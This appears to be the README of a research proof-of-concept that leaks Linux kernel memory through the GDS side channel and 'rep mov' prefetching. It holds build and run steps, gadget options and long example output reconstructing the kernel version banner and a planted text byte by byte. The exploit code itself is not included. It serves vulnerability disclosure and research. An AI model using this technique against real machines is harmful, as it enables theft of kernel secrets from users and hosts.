# Leaking arbitrary kernel memory with GDS

This is a proof-of-concept that shows that combining GDS with the prefetching behavior of the `rep mov` instruction enable an attacker to steal arbitrary data from the Linux kernel.

## Usage
After choosing the gadget in the `config.h`

`make clean && make`

`cd helper_lkm && ./reinstall.sh`

`./run_arbitrary_leak.sh` for `KERNEL_GADGET_SAFEZ` and `KERNEL_GADGET_BUG`
`./run_oob_leak.sh` for `KERNEL_GADGET_SAFE`


`./

## config.h
Chose a gadget to attack. The LKM that injects the gadget into the kernel has to be recompiled after changing this.

```
KERNEL_GADGET_SAFE, KERNEL_GADGET_SAFEZ, KERNEL_GADGET_BUG
```

## Example output
KERNEL_GADGET_SAFEZ 1

```
danielmm@laptop:~/PATH/POC/gds_memcpy_prefetch$ ./run_arbitrary_leak.sh 
[+] Flush+Reload Threshold: 150
Found: Linu
Total Leak: 4
Linu
---
Found: nux 
Total Leak: 6
Linux 
---
Found: x ve
Total Leak: 8
Linux ve
---
Found: vers
Total Leak: 10
Linux vers
---
Found: rsio
Total Leak: 12
Linux versio
---
Found: ion 
Total Leak: 14
Linux version 
---
Found: n 5.
Total Leak: 16
Linux version 5.
---
Found: 5.19
Total Leak: 18
Linux version 5.19
---
Found: 19.0
Total Leak: 20
Linux version 5.19.0
---
Found: .0-5
Total Leak: 22
Linux version 5.19.0-5
---
Found: -50-
Total Leak: 24
Linux version 5.19.0-50-
---
Found: 0-ge
Total Leak: 26
Linux version 5.19.0-50-ge
---
Found: gene
Total Leak: 28
Linux version 5.19.0-50-gene
---
Found: neri
Total Leak: 30
Linux version 5.19.0-50-generi
---
Found: ric 
Total Leak: 32
Linux version 5.19.0-50-generic 
---
Found: c (b
Total Leak: 34
Linux version 5.19.0-50-generic (b
---
Found: (bui
Total Leak: 36
Linux version 5.19.0-50-generic (bui
---
Found: uild
Total Leak: 38
Linux version 5.19.0-50-generic (build
---
Found: ldd@
Total Leak: 40
Linux version 5.19.0-50-generic (buildd@
---
Found: d@lc
Total Leak: 42
Linux version 5.19.0-50-generic (buildd@lc
---
Found: lcy0
Total Leak: 44
Linux version 5.19.0-50-generic (buildd@lcy0
---
Found: y02-
Total Leak: 46
Linux version 5.19.0-50-generic (buildd@lcy02-
---
Found: 2-am
Total Leak: 48
Linux version 5.19.0-50-generic (buildd@lcy02-am
---
Found: amd6
Total Leak: 50
Linux version 5.19.0-50-generic (buildd@lcy02-amd6
---
Found: d64-
Total Leak: 52
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-
---
Found: 4-03
Total Leak: 54
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-03
---
Found: 030)
Total Leak: 56
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030)
---
Found: 0) (
Total Leak: 58
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (
---
Found:  (x8
Total Leak: 60
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x8
---
Found: x86_
Total Leak: 62
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_
---
Found: 6_64
Total Leak: 64
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64
---
Found: 64-l
Total Leak: 66
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-l
---
Found: -lin
Total Leak: 68
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-lin
---
Found: inux
Total Leak: 70
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux
---
Found: ux-g
Total Leak: 72
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-g
---
Found: -gnu
Total Leak: 74
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu
---
Found: nu-g
Total Leak: 76
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-g
---
Found: -gcc
Total Leak: 78
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc
---
Found: cc (
Total Leak: 80
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (
---
Found:  (Ub
Total Leak: 82
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ub
---
Found: Ubun
Total Leak: 84
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubun
---
Found: untu
Total Leak: 86
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu
---
Found: tu 1
Total Leak: 88
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 1
---
Found:  11.
Total Leak: 90
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.
---
Found: 1.3.
Total Leak: 92
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.
---
Found: 3.0-
Total Leak: 94
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-
---
Found: 0-1u
Total Leak: 96
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1u
---
Found: 1ubu
Total Leak: 98
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubu
---
Found: bunt
Total Leak: 100
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubunt
---
Found: ntu1
Total Leak: 102
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1
---
Found: u1~2
Total Leak: 104
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~2
---
Found: ~22.
Total Leak: 106
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.
---
Found: 2.04
Total Leak: 108
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04
---
Found: 04.1
Total Leak: 110
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1
---
Found: .1) 
Total Leak: 112
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 
---
Found: ) 11
Total Leak: 114
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11
---
Found: 11.3
Total Leak: 116
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3
---
Found: .3.0
Total Leak: 118
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0
---
Found: .0, 
Total Leak: 120
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, 
---
Found: , GN
Total Leak: 122
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GN
---
Found: GNU 
Total Leak: 124
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU 
---
Found: U ld
Total Leak: 126
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld
---
Found: ld (
Total Leak: 128
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (
---
Found:  (GN
Total Leak: 130
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GN
---
Found: GNU 
Total Leak: 132
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU 
---
Found: U Bi
Total Leak: 134
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Bi
---
Found: Binu
Total Leak: 136
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binu
---
Found: nuti
Total Leak: 138
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binuti
---
Found: tils
Total Leak: 140
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils
---
Found: ls f
Total Leak: 142
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils f
---
Found:  for
Total Leak: 144
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for
---
Found: or U
Total Leak: 146
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for U
---
Found:  Ubu
Total Leak: 148
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubu
---
Found: bunt
Total Leak: 150
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubunt
---
Found: ntu)
Total Leak: 152
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu)
---
Found: u) 2
Total Leak: 154
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2
---
Found:  2.3
Total Leak: 156
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.3
---
Found: .38)
Total Leak: 158
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38)
---
Found: 8) #
Total Leak: 160
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #
---
Found:  #50
Total Leak: 162
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50
---
Found: 50-U
Total Leak: 164
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-U
---
Found: -Ubu
Total Leak: 166
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubu
---
Found: bunt
Total Leak: 168
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubunt
---
Found: ntu 
Total Leak: 170
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu 
---
Found: u SM
Total Leak: 172
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SM
---
Found: SMP 
Total Leak: 174
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP 
---
Found: P PR
Total Leak: 176
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PR
---
Found: PREE
Total Leak: 178
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREE
---
Found: EEMP
Total Leak: 180
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMP
---
Found: MPT_
Total Leak: 182
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_
---
Found: T_DY
Total Leak: 184
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DY
---
Found: DYNA
Total Leak: 186
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNA
---
Found: NAMI
Total Leak: 188
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMI
---
Found: MIC 
Total Leak: 190
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC 
---
Found: C Mo
Total Leak: 192
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mo
---
Found: Mon 
Total Leak: 194
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon 
---
Found: n Ju
Total Leak: 196
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Ju
---
Found: Jul 
Total Leak: 198
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 
---
Found: l 10
Total Leak: 200
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10
---
Found: 10 1
Total Leak: 202
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 1
---
Found:  18:
Total Leak: 204
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:
---
Found: 8:24
Total Leak: 206
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24
---
Found: 24:2
Total Leak: 208
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:2
---
Found: :29 
Total Leak: 210
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 
---
Found: 9 UT
Total Leak: 212
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UT
---
Found: UTC 
Total Leak: 214
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 
---
Found: C 20
Total Leak: 216
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 20
---
Found: 2023
Total Leak: 218
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023
---
Found: 23 (
Total Leak: 220
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (
---
Found:  (Ub
Total Leak: 222
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ub
---
Found: Ubun
Total Leak: 224
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubun
---
Found: untu
Total Leak: 226
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubuntu
---
Found: tu 5
Total Leak: 228
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubuntu 5
---
Found:  5.1
Total Leak: 230
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubuntu 5.1
---
Found: .19.
Total Leak: 232
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubuntu 5.19.
---
Found: 9.0-
Total Leak: 234
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubuntu 5.19.0-
---
Found: 0-50
Total Leak: 236
Linux version 5.19.0-50-generic (buildd@lcy02-amd64-030) (x86_64-linux-gnu-gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #50-Ubuntu SMP PREEMPT_DYNAMIC Mon Jul 10 18:24:29 UTC 2023 (Ubuntu 5.19.0-50
---
```



```
danielmm@laptop:~/PATH/POC/gds_memcpy_prefetch$ ./run_oob_leak.sh 
[+] Flush+Reload Threshold: 148
Found: Linu
Total Leak: 4
Linu
---
Found: nus 
Total Leak: 6
Linus 
---
Found: s To
Total Leak: 8
Linus To
---
Found: Torv
Total Leak: 10
Linus Torv
---
Found: rval
Total Leak: 12
Linus Torval
---
Found: alds
Total Leak: 14
Linus Torvalds
---
Found: ds; 
Total Leak: 16
Linus Torvalds; 
---
Found: ; bo
Total Leak: 18
Linus Torvalds; bo
---
Found: born
Total Leak: 20
Linus Torvalds; born
---
Found: rn 2
Total Leak: 22
Linus Torvalds; born 2
---
Found:  28 
Total Leak: 24
Linus Torvalds; born 28 
---
Found: 8 De
Total Leak: 26
Linus Torvalds; born 28 De
---
Found: Dece
Total Leak: 28
Linus Torvalds; born 28 Dece
---
Found: cemb
Total Leak: 30
Linus Torvalds; born 28 Decemb
---
Found: mber
Total Leak: 32
Linus Torvalds; born 28 December
---
Found: er 1
Total Leak: 34
Linus Torvalds; born 28 December 1
---
Found:  196
Total Leak: 36
Linus Torvalds; born 28 December 196
---
Found: 969 
Total Leak: 38
Linus Torvalds; born 28 December 1969 
---
Found: 9 is
Total Leak: 40
Linus Torvalds; born 28 December 1969 is
---
Found: is a
Total Leak: 42
Linus Torvalds; born 28 December 1969 is a
---
Found:  a F
Total Leak: 44
Linus Torvalds; born 28 December 1969 is a F
---
Found:  Fin
Total Leak: 46
Linus Torvalds; born 28 December 1969 is a Fin
---
Found: inni
Total Leak: 48
Linus Torvalds; born 28 December 1969 is a Finni
---
Found: nish
Total Leak: 50
Linus Torvalds; born 28 December 1969 is a Finnish
---
Found: sh-A
Total Leak: 52
Linus Torvalds; born 28 December 1969 is a Finnish-A
---
Found: -Ame
Total Leak: 54
Linus Torvalds; born 28 December 1969 is a Finnish-Ame
---
Found: meri
Total Leak: 56
Linus Torvalds; born 28 December 1969 is a Finnish-Ameri
---
Found: rica
Total Leak: 58
Linus Torvalds; born 28 December 1969 is a Finnish-America
---
Found: can 
Total Leak: 60
Linus Torvalds; born 28 December 1969 is a Finnish-American 
---
Found: n so
Total Leak: 62
Linus Torvalds; born 28 December 1969 is a Finnish-American so
---
Found: soft
Total Leak: 64
Linus Torvalds; born 28 December 1969 is a Finnish-American soft
---
Found: ftwa
Total Leak: 66
Linus Torvalds; born 28 December 1969 is a Finnish-American softwa
---
Found: ware
Total Leak: 68
Linus Torvalds; born 28 December 1969 is a Finnish-American software
---
Found: re e
Total Leak: 70
Linus Torvalds; born 28 December 1969 is a Finnish-American software e
---
Found:  eng
Total Leak: 72
Linus Torvalds; born 28 December 1969 is a Finnish-American software eng
---
Found: ngin
Total Leak: 74
Linus Torvalds; born 28 December 1969 is a Finnish-American software engin
---
Found: inee
Total Leak: 76
Linus Torvalds; born 28 December 1969 is a Finnish-American software enginee
---
Found: eer 
Total Leak: 78
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer 
---
Found: r wh
Total Leak: 80
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer wh
---
Found: who 
Total Leak: 82
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who 
---
Found: o is
Total Leak: 84
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is
---
Found: is t
Total Leak: 86
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is t
---
Found:  the
Total Leak: 88
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the
---
Found: he c
Total Leak: 90
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the c
---
Found:  cre
Total Leak: 92
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the cre
---
Found: reat
Total Leak: 94
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creat
---
Found: ator
Total Leak: 96
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator
---
Found: or a
Total Leak: 98
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator a
---
Found:  and
Total Leak: 100
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and
---
Found: nd, 
Total Leak: 102
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, 
---
Found: , hi
Total Leak: 104
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, hi
---
Found: hist
Total Leak: 106
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, hist
---
Found: stor
Total Leak: 108
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, histor
---
Found: oric
Total Leak: 110
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historic
---
Found: ical
Total Leak: 112
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historical
---
Found: ally
Total Leak: 114
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically
---
Found: ly, 
Total Leak: 116
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically, 
---
Found: , th
Total Leak: 118
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically, th
---
Found: the 
Total Leak: 120
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically, the 
---
Found: e ma
Total Leak: 122
Linus Torvalds; born 28 December 1969 is a Finnish-American software engineer who is the creator and, historically, the ma
---
Found: main
Total Leak: 124
